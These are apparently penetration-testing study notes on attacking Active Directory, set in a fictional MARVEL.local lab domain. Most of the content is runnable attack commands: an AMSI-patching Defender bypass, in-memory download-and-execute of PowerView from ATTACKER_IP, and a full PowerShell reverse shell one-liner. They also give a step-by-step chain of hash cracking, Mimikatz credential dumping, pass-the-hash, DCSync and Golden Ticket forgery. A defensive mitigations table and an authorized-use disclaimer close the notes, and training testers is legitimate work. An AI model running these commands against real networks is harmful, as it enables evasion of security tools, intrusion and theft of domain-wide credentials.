# Active Directory Post-Compromise Enumeration

> **Red Team Notes** | Post-Exploitation Phase | PowerView & Impacket  
> Domain: `MARVEL.local` | Difficulty: Beginner → Intermediate

---

## Table of Contents

- [What is Post-Compromise Enumeration](#what-is-post-compromise-enumeration)
- [Active Directory Basics](#active-directory-basics)
- [PowerView — Tool Overview](#powerview--tool-overview)
- [Environment Setup & AV Bypass](#environment-setup--av-bypass)
- [Domain Enumeration](#domain-enumeration)
- [User Enumeration](#user-enumeration)
- [Group Enumeration](#group-enumeration)
- [Computer Enumeration](#computer-enumeration)
- [User Property Analysis](#user-property-analysis)
- [Advanced Enumeration](#advanced-enumeration)
  - [Find Active Admin Sessions](#find-active-admin-sessions)
  - [SMB Share Enumeration](#smb-share-enumeration)
  - [ACL Enumeration](#acl-enumeration)
  - [Kerberoasting Targets](#kerberoasting-targets)
  - [AS-REP Roasting Targets](#as-rep-roasting-targets)
  - [Trust Enumeration](#trust-enumeration)
- [Access Without RDP](#access-without-rdp)
- [Full Attack Chain](#full-attack-chain)
- [Quick Reference Table](#quick-reference-table)

---

## What is Post-Compromise Enumeration

Post-Compromise Enumeration is the process of **mapping a target network after obtaining initial access** — gathering intelligence about users, machines, policies, and privilege paths before attempting privilege escalation.

### When It Is Used

- After capturing and cracking an NTLM hash (via LLMNR/NBT-NS Poisoning)
- After gaining a shell via SMB Relay, phishing, or exploit
- Before privilege escalation — to identify the best path forward
- During lateral movement planning

### Why It Matters

Without enumeration, an attacker operates blind. Enumeration answers:
- Who are the Domain Admins?
- Where are they logged in right now?
- What machines exist on the network?
- Is the password policy weak enough to brute-force?
- Are there misconfigurations we can abuse (Kerberoasting, ACLs, AS-REP Roasting)?

> **Analogy:** A thief who breaks into a building doesn't run straight to the vault. They first case the floor — where are the cameras, where are the keys, who is still in the office. Post-compromise enumeration is exactly that — *casing the network*.

---

## Active Directory Basics

| Component | Description | Attacker Interest |
|-----------|-------------|-------------------|
| **Domain** | Logical boundary grouping users, computers, policies | Scope of the attack |
| **Forest** | Collection of one or more domains | Cross-domain attack surface |
| **Domain Controller (DC)** | Stores all credentials (NTDS.dit), enforces policies | **Ultimate target** |
| **User Account** | Identity object with credentials | Credential theft target |
| **Group** | Collection of users with shared privileges | Privilege mapping |
| **GPO** | Group Policy — controls security settings | Policy weakness detection |
| **OU** | Organizational Unit — logical container | Scope understanding |

### Key AD Attack Targets

```
MARVEL.local
├── HYDRA-DC.MARVEL.local        ← Domain Controller (Primary Target)
├── Users
│   ├── tony.stark               ← Domain Admin
│   ├── nick.fury                ← Domain Admin
│   ├── peter.parker             ← Standard user (Initial Access)
│   └── sql_svc                  ← Service Account (Kerberoasting)
└── Computers
    ├── IRONMAN-WS.MARVEL.local  ← tony.stark's workstation
    └── SHIELD-FILE.MARVEL.local ← File server
```

---

## PowerView — Tool Overview

PowerView is an open-source PowerShell reconnaissance script, part of the **PowerSploit** framework. It queries Active Directory via LDAP and exposes information that standard Windows tools hide from non-admin users.

**Repository:** `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`

### Why PowerView Over Built-in Tools?

| Feature | `net user /domain` | `Get-ADUser` | **PowerView** |
|---------|-------------------|--------------|---------------|
| Admin flag detection | No | Partial | **Yes** |
| ACL enumeration | No | No | **Yes** |
| Logged-in user sessions | No | No | **Yes** |
| Kerberoastable accounts | No | No | **Yes** |
| Trust enumeration | No | Partial | **Yes** |
| No extra module needed | Yes | No (RSAT) | **Yes** |

### Where to Run

- **On the victim (domain-joined) machine** — preferred. It communicates directly with the DC and all commands work natively.
- On the attacker machine — possible with RSAT + credentials, but more complex setup required.

---

## Environment Setup & AV Bypass

### Host a Python HTTP Server (Attacker Machine)

```bash
# Serve PowerView from your Kali/Parrot machine
python3 -m http.server 80
```

### Import PowerView — Basic

```powershell
# Dot-source import (if file is on disk)
. .\PowerView.ps1

# Module import
Import-Module .\PowerView.ps1
```

### Import PowerView — In-Memory (AV Bypass)

```powershell
# Load directly into memory — no file touches disk
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# HTTPS version
IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER_IP/PowerView.ps1')
```

### Bypass Execution Policy

```powershell
# Process-level bypass
powershell -ep bypass

# Or set it in session
Set-ExecutionPolicy Bypass -Scope Process

# One-liner: bypass + import + run
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1'); Get-NetDomain"
```

### AMSI Bypass (Windows Defender)

```powershell
# Patch AMSI context in memory before loading PowerView
$a=[Ref].Assembly.GetTypes()
foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# In Evil-WinRM (built-in bypass command)
Bypass-4MSI
```

> **Order matters:** Run AMSI bypass → then import PowerView. Skipping this step may result in Defender blocking the script.

---

## Domain Enumeration

### Get-NetDomain

Returns information about the current (or specified) domain — name, forest, DC list, and FSMO role holders.

```powershell
# Current domain info
Get-NetDomain

# Query a specific domain
Get-NetDomain -Domain SHIELD.local

# Forest enumeration
Get-NetForest
Get-NetForestDomain
Get-NetForestCatalog
```

**Sample Output:**
```
Forest                  : MARVEL.local
DomainControllers       : {HYDRA-DC.MARVEL.local}
DomainMode              : Unknown
DomainModeLevel         : 7
PdcRoleOwner            : HYDRA-DC.MARVEL.local
Name                    : MARVEL.local
```

**What the attacker learns:**
- Domain name → used in subsequent queries
- DC hostname → target for Pass-the-Hash, DCSync, Golden Ticket
- `DomainModeLevel: 7` → Windows Server 2016+ features active

---

### Get-NetDomainController

Returns detailed information about all Domain Controllers — IP address, OS version, FSMO roles, site name.

```powershell
# All DCs in current domain
Get-NetDomainController

# Specific domain's DC
Get-NetDomainController -Domain MARVEL.local

# Filtered output
Get-NetDomainController | select Name, IPAddress, OSVersion, Roles
```

**Sample Output:**
```
OSVersion   : Windows Server 2019 Standard
Roles       : {SchemaRole, NamingRole, PdcRole, RidRole, InfraRole}
IPAddress   : 192.168.64.138
Name        : HYDRA-DC.MARVEL.local
```

**What the attacker learns:**
- DC IP address → target for final-stage attacks
- OS version → check for known DC vulnerabilities (ZeroLogon, PrintNightmare)
- All FSMO roles on one DC → single point of compromise for full domain takeover

---

## User Enumeration

### Get-NetUser

The most important enumeration command. Returns every domain user with all attributes — admin flags, group memberships, logon statistics, password settings, and descriptions (which often contain plaintext passwords).

```powershell
# All users
Get-NetUser

# Usernames only
Get-NetUser | select samaccountname

# Specific user
Get-NetUser -Username tony.stark

# All admin accounts (admincount=1)
Get-NetUser -AdminCount

# Check descriptions for embedded passwords (common misconfiguration)
Get-NetUser | select samaccountname, description

# Accounts with SPN set → Kerberoasting targets
Get-NetUser -SPN

# Accounts with pre-authentication disabled → AS-REP Roasting targets
Get-NetUser -PreauthNotRequired

# Key fields for analysis
Get-NetUser | select samaccountname, pwdlastset, logoncount, badpwdcount, admincount

# Password never expires
Get-NetUser | Where-Object {$_.useraccountcontrol -match "DONT_EXPIRE_PASSWORD"}
```

**Sample Output:**
```
logoncount      : 412
description     : Director of S.H.I.E.L.D - Password: Avengers@2024!
samaccountname  : tony.stark
admincount      : 1
memberof        : {Domain Admins, Enterprise Admins}
pwdlastset      : 3/15/2026 8:22:11 AM
```

**What the attacker learns:**
- `admincount=1` → confirmed administrator account
- `description` field contains a **plaintext password** (common in enterprise environments)
- `memberof: Domain Admins + Enterprise Admins` → this account has forest-level access
- Compromising `tony.stark` = full domain and forest compromise

---

## Group Enumeration

### Get-NetGroup

Lists all domain groups. Used to identify high-privilege groups and custom admin groups.

```powershell
# All groups
Get-NetGroup

# Usernames only
Get-NetGroup | select samaccountname

# Filter by keyword (wildcard supported)
Get-NetGroup "*admin*"
Get-NetGroup "*Domain*"

# Full group details
Get-NetGroup -GroupName "Domain Admins" -FullData
```

### Get-NetGroupMember

Returns members of a specific group. Most critical use: enumerate **Domain Admins** and **Enterprise Admins**.

```powershell
# Domain Admins members
Get-NetGroupMember "Domain Admins"

# Enterprise Admins (forest-level privilege)
Get-NetGroupMember "Enterprise Admins"

# Recursive — includes nested group members
Get-NetGroupMember "Domain Admins" -Recurse

# All groups a specific user belongs to
Get-NetGroup -Username "peter.parker"
```

**Sample Output:**
```
GroupName    : Domain Admins
MemberName   : tony.stark
MemberSID    : S-1-5-21-293256112-...-500
IsGroup      : False

MemberName   : nick.fury
MemberSID    : S-1-5-21-293256112-...-1103
```

**What the attacker learns:**
- Primary target list established: `tony.stark`, `nick.fury`
- Once their credentials are obtained → `Get-NetComputer` to find where they're logged in

---

## Computer Enumeration

### Get-NetComputer

Returns all domain-joined computers with OS info, last logon timestamps, and hostnames. Essential for planning lateral movement.

```powershell
# All computers
Get-NetComputer

# Hostnames only
Get-NetComputer | select dnshostname

# With OS details
Get-NetComputer -FullData | select dnshostname, operatingsystem, operatingsystemversion

# Filter servers only
Get-NetComputer -OperatingSystem "*Server*"

# Check which machines are currently online
Get-NetComputer -Ping

# Full data dump
Get-NetComputer -FullData
```

**Sample Output:**
```
dnshostname                  operatingsystem               lastlogontimestamp
-----------                  ---------------               -----------------
HYDRA-DC.MARVEL.local        Windows Server 2019 Standard  5/5/2026
SPIDERMAN-PC.MARVEL.local    Windows 10 Pro                5/4/2026
IRONMAN-WS.MARVEL.local      Windows 11 Enterprise         5/5/2026
SHIELD-FILE.MARVEL.local     Windows Server 2016           5/3/2026
WIDOW-LAPTOP.MARVEL.local    Windows 10 Enterprise         5/1/2026
```

**What the attacker learns:**
- `IRONMAN-WS` → tony.stark's workstation (Domain Admin works here)
- `SHIELD-FILE` → likely contains sensitive documents and credentials
- `lastlogontimestamp` → identifies active machines worth targeting

---

## User Property Analysis

### Get-UserProperty

Queries specific user attributes across all domain users. Used to identify service accounts, stale accounts, and accounts under active attack.

```powershell
# View all available properties
Get-UserProperty

# Logon count — low count = service or test account
Get-UserProperty -Properties logoncount

# Password last set — old date = potentially weak/stale password
Get-UserProperty -Properties pwdlastset

# Bad password count — already targeted by brute force?
Get-UserProperty -Properties badpwdcount

# Last logon timestamp
Get-UserProperty -Properties lastlogon
```

**Sample Output:**
```
name          logoncount    pwdlastset              badpwdcount
----          ----------    ----------              -----------
tony.stark    412           3/15/2026               0
peter.parker  3             1/1/2024                0     ← stale password
nick.fury     287           4/20/2026               0
jarvis        1             6/15/2022               0     ← service account
thanos        0             12/1/2021               0     ← never logged in
sql_svc       8             2/14/2023               0     ← Kerberoasting target
```

**Analysis:**
- `peter.parker` — `logoncount=3`, password set in 2024 → likely test/low-privilege account with a weak password
- `jarvis` — `logoncount=1`, password set in 2022 → service account, password likely unchanged
- `thanos` — `logoncount=0` → never logged in; could be a default account, test account, or honeypot
- `sql_svc` — SQL service account with SPN → **prime Kerberoasting target**

---

## Advanced Enumeration

### Find Active Admin Sessions

The most operationally valuable command. Identifies which machine a Domain Admin is currently logged into.

```powershell
# Find where Domain Admins are currently logged in
Find-DomainUserLocation

# Filter for Domain Admins specifically
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Check if current user has local admin access on found machines
Find-DomainUserLocation -CheckAccess
```

**Sample Output:**
```
UserName     : tony.stark
ComputerName : IRONMAN-WS.MARVEL.local
IPAddress    : 192.168.64.142
IsLocalAdmin : True
```

> **This is the pivot point.** Move laterally to `IRONMAN-WS`, dump credentials with Mimikatz, and obtain Domain Admin NTLM hash.

---

### SMB Share Enumeration

```powershell
# All SMB shares in the domain
Find-DomainShare

# Only shares the current user can access
Find-DomainShare -CheckShareAccess

# Search for sensitive files across accessible shares
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include "*.txt","*.xml","*.config","*.ini","*.pass","*.kdbx"
```

**Sample Output:**
```
SharePath   : \\SHIELD-FILE.MARVEL.local\IT-Docs
Readable    : True
Files Found : web.config, passwords.txt, credentials.xml
```

---

### ACL Enumeration

ACL misconfigurations are one of the most common privilege escalation paths in Active Directory environments.

```powershell
# ACLs on a specific object
Get-ObjectAcl -SamAccountName "tony.stark" -ResolveGUIDs

# Find all GenericAll rights (full control over an object)
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

# Check what rights a specific user has
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "peter.parker"}

# Find who has DCSync rights (DS-Replication-Get-Changes)
Get-ObjectAcl -DistinguishedName "DC=MARVEL,DC=local" -ResolveGUIDs | `
    ?{($_.ActiveDirectoryRights -match "DS-Replication-Get-Changes")}
```

> **Why this matters:** If `peter.parker` has `GenericAll` rights over `tony.stark`, he can reset tony's password without ever needing Domain Admin credentials directly.

---

### Kerberoasting Targets

```powershell
# Find accounts with SPN set (Kerberoasting targets)
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# Request and capture service tickets for offline cracking
Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | fl

# Crack with Hashcat (mode 13100)
# hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Sample Output:**
```
samaccountname   serviceprincipalname
--------------   --------------------
sql_svc          MSSQLSvc/SHIELD-SQL.MARVEL.local:1433
http_svc         HTTP/webserver.MARVEL.local
backup_svc       backup/HYDRA-DC.MARVEL.local
```

---

### AS-REP Roasting Targets

```powershell
# Find accounts with pre-authentication disabled
Get-NetUser -PreauthNotRequired | select samaccountname

# Attack using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Attack using Impacket (from Kali)
GetNPUsers.py MARVEL.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 192.168.64.138

# Crack with Hashcat (mode 18200)
# hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Trust Enumeration

```powershell
# Domain trusts
Get-NetDomainTrust
Get-NetDomainTrust -Domain MARVEL.local

# Forest trusts
Get-NetForestTrust

# All domains in the forest
Get-NetForestDomain
```

**Sample Output:**
```
SourceName      : MARVEL.local
TargetName      : SHIELD.local
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustDirection  : Bidirectional
```

> **Bidirectional trust** means that if you compromise `MARVEL.local`, you have a path to attack `SHIELD.local` as well.

---

## Access Without RDP

In real-world engagements, RDP is rarely available. The following methods provide PowerShell access to run PowerView.

### Method 1 — Evil-WinRM (Recommended)

Requires WinRM (port 5985) to be open. Provides a full PowerShell session with built-in AMSI bypass.

```bash
# With credentials
evil-winrm -i 192.168.64.138 -u peter.parker -p 'Password123!'

# With NTLM hash (Pass-the-Hash)
evil-winrm -i 192.168.64.138 -u tony.stark -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
```

```powershell
# Once inside
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
*Evil-WinRM* PS> Get-NetDomain
```

### Method 2 — Meterpreter

```
meterpreter > load powershell
meterpreter > powershell_shell
PS > IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Or directly
meterpreter > powershell_execute "IEX(New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1'); Get-NetUser"
```

### Method 3 — Reverse Shell

```bash
# Attacker: start listener
rlwrap nc -lvnp 4444
```

```powershell
# Victim: PowerShell reverse shell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$nb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($nb,0,$nb.Length)}"
```

### Method 4 — Impacket (From Kali, No Shell Needed)

```bash
# Enumerate AD users directly from Kali
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py MARVEL.local/peter.parker:'Password123!' -all

# Find Kerberoastable accounts
GetUserSPNs.py MARVEL.local/peter.parker:'Password123!' -dc-ip 192.168.64.138

# Kerberoast and get hashes
GetUserSPNs.py MARVEL.local/peter.parker:'Password123!' -dc-ip 192.168.64.138 -request -outputfile kerberoast.txt
```

---

## Full Attack Chain

```
LLMNR Poisoning → Hash Capture → Crack/Relay → Initial Access → Enumeration → Lateral Movement → DA Credentials → Domain Owned
```

### Step-by-Step on MARVEL.local

```bash
# ============================================================
# PHASE 1: INITIAL ACCESS
# ============================================================

# Step 1: LLMNR Poisoning — run Responder
sudo responder -I eth0 -wrf
# Captured: peter.parker::MARVEL:a98127...

# Step 2: Crack the hash
hashcat -m 5600 peter.hash /usr/share/wordlists/rockyou.txt
# Result: peter.parker : Password123!

# Step 3: Initial shell via Evil-WinRM
evil-winrm -i 192.168.64.138 -u peter.parker -p 'Password123!'
```

```powershell
# ============================================================
# PHASE 2: POST-COMPROMISE ENUMERATION
# ============================================================

# Step 4: Load PowerView
Bypass-4MSI
IEX(New-Object Net.WebClient).DownloadString('http://192.168.64.1/PowerView.ps1')

# Step 5: Map the domain
Get-NetDomain                                              # MARVEL.local, HYDRA-DC
Get-NetDomainController                                    # DC IP: 192.168.64.138
(Get-DomainPolicy)."system access"                        # LockoutBadCount: 0 (no lockout!)
Get-NetUser -AdminCount | select samaccountname           # tony.stark, nick.fury
Get-NetGroupMember "Domain Admins"                        # tony.stark, nick.fury = DA
Get-NetComputer -FullData | select dnshostname,os         # Map all machines
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
# tony.stark is logged in on IRONMAN-WS (192.168.64.142)
```

```bash
# ============================================================
# PHASE 3: LATERAL MOVEMENT
# ============================================================

# Step 6: Move to IRONMAN-WS where tony.stark is active
evil-winrm -i 192.168.64.142 -u peter.parker -p 'Password123!'
# Or with psexec
psexec.py MARVEL.local/peter.parker:'Password123!'@192.168.64.142
```

```powershell
# Step 7: Dump tony.stark's credentials with Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
# tony.stark NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

```bash
# ============================================================
# PHASE 4: DOMAIN COMPROMISE
# ============================================================

# Step 8: Pass-the-Hash with Domain Admin to DC
evil-winrm -i 192.168.64.138 -u tony.stark -H '32ed87bdb5fdc5e9cba88547376818d4'

# Step 9: DCSync — dump all domain hashes
secretsdump.py MARVEL.local/tony.stark@192.168.64.138 \
    -hashes :32ed87bdb5fdc5e9cba88547376818d4
# krbtgt hash obtained!
```

```powershell
# Step 10: Golden Ticket — permanent, unrevokable access
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:MARVEL.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt"'
# DOMAIN FULLY COMPROMISED
```

---

## Quick Reference Table

| Command | Purpose | Key Finding |
|---------|---------|-------------|
| `Get-NetDomain` | Domain name, DC, forest | DC hostname for targeting |
| `Get-NetDomainController` | DC IP, OS version | IP for final-stage attacks |
| `(Get-DomainPolicy)."system access"` | Password & lockout policy | `LockoutBadCount=0` = brute force safe |
| `Get-NetUser` | All users with attributes | `admincount=1` = admin accounts |
| `Get-NetUser \| select samaccountname,description` | User descriptions | Plaintext passwords in description |
| `Get-NetUser -SPN` | SPN-set accounts | Kerberoasting targets |
| `Get-NetUser -PreauthNotRequired` | Pre-auth disabled accounts | AS-REP Roasting targets |
| `Get-NetUser -AdminCount` | Admin-flagged accounts | High-value targets |
| `Get-NetGroup "*admin*"` | Admin group names | Privilege group mapping |
| `Get-NetGroupMember "Domain Admins"` | Domain Admin members | Primary target list |
| `Get-NetGroupMember "Enterprise Admins"` | Forest-level admins | Forest-wide attack surface |
| `Get-NetComputer -FullData` | All machines + OS | Lateral movement map |
| `Get-NetComputer -Ping` | Live machines only | Active targets |
| `Get-UserProperty -Properties logoncount` | Per-user logon counts | Low count = service account |
| `Get-UserProperty -Properties pwdlastset` | Password age per user | Old date = stale/weak password |
| `Find-DomainUserLocation` | Active sessions | Where Domain Admins are right now |
| `Find-DomainShare -CheckShareAccess` | Accessible SMB shares | Sensitive file hunting |
| `Find-InterestingDomainShareFile` | Files across shares | Config files, credential files |
| `Get-ObjectAcl -ResolveGUIDs` | ACL misconfigurations | Privilege escalation without DA |
| `Invoke-Kerberoast` | Kerberoasting | Offline hash cracking |
| `Get-NetDomainTrust` | Domain trust relationships | Cross-domain attack paths |

---

## Password Policy Risk Matrix

| Setting | Secure Value | Risky Value | Impact |
|---------|-------------|-------------|--------|
| `LockoutBadCount` | 3–5 | **0** | No lockout = unlimited brute force |
| `MinimumPasswordLength` | 12+ | **≤7** | Short passwords = faster cracking |
| `PasswordComplexity` | 1 (enabled) | **0** | Simple passwords allowed |
| `MaximumPasswordAge` | 90 days | **Never** | Old passwords = increased compromise risk |
| `ClearTextPassword` | 0 | **1** | Reversible encryption = plaintext exposure |

---

## Defensive Mitigations (Blue Team Reference)

| Attack Vector | Mitigation |
|--------------|------------|
| PowerView usage | PowerShell Script Block Logging + AMSI |
| LLMNR Poisoning | Disable LLMNR and NBT-NS via GPO |
| Kerberoasting | Use long, random service account passwords (25+ chars) |
| AS-REP Roasting | Enable pre-authentication on all accounts |
| Pass-the-Hash | Enable Protected Users group, disable NTLM where possible |
| Weak password policy | Enforce `MinimumPasswordLength ≥ 12`, enable complexity |
| Credential in description | Regular AD audits; enforce credential hygiene |
| ACL misconfigurations | Run BloodHound regularly to identify attack paths |

---

## Tools Referenced

| Tool | Purpose | Source |
|------|---------|--------|
| PowerView | AD enumeration (PowerShell) | PowerSploit / GitHub |
| Evil-WinRM | Remote shell via WinRM | `gem install evil-winrm` |
| Mimikatz | Credential dumping | GitHub / Kali repo |
| Rubeus | Kerberos attacks | GitHub |
| Impacket | Python AD attack suite | `pip3 install impacket` |
| Responder | LLMNR/NBT-NS poisoning | Built into Kali |
| Hashcat | Offline hash cracking | Built into Kali |
| BloodHound | AD attack path visualization | GitHub |

---

## Related Topics

- [LLMNR & NBT-NS Poisoning](https://github.com/Kevin-Robertson/Responder)
- [SMB Relay Attacks](https://github.com/SecureAuthCorp/impacket)
- [Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Pass-the-Hash](https://attack.mitre.org/techniques/T1550/002/)
- [DCSync Attack](https://attack.mitre.org/techniques/T1003/006/)
- [BloodHound / SharpHound](https://github.com/BloodHoundAD/BloodHound)

---

*These notes are intended for authorized penetration testing and red team engagements only. Always operate within the scope of written authorization.*
